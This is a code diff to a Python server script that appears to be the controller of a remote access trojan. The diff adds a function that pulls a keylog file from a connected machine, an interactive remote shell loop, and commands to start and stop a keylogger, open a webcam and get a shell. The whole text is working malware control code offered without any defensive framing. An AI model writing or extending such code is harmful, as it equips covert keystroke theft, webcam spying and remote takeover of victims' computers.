@@ -52,25 +52,48 @@ def webCam(conn, command, addr):
 def getKeys(conn, command, addr):
     conn.send(command)
     
+def transfer(conn,command):
+    conn.send(command)
+    f = open('test.txt','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if bits.endswith(b'DONE'):
+            print('[+] Transferring KeyLog File...')
+            time.sleep(2)
+            print('\n[+] Transfer completed ')
+            f.close()
+            break
+        f.write(bits)
+    
+def get_shell(conn, command):
+   conn.send(command) 
+   while True:
+        cmd = input(" CMD > ").encode()
+        
+        if b'close' in cmd:
+            break
+        conn.send(cmd)
+        stdout = conn.recv(1024*1024)
+
+        print(stdout.decode())
 
 def start():
     server.listen()
     print(f"[LISTENING] -- Server is listeing on {SERVER}")
     while True:
         conn, addr = server.accept()
-        # thread = threading.Thread(target=handle_client, args=(conn, addr))
-        # thread.start()
-        # print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
         
         while True:
             command = input(" >> ").encode()
             print(command, type(command))
             if b'open_webcam' in command:
                 webCam(conn, command, addr)
-            elif b'start_logger' in command:
-                getKeys()
+            elif b'logger_start' in command:
+                conn.send(command)
+            elif b'logger_end' in command:
+                transfer(conn, command)
             elif b'get_shell' in command:
-                getShell()
+                get_shell(conn, command)
             else:
                 break
         
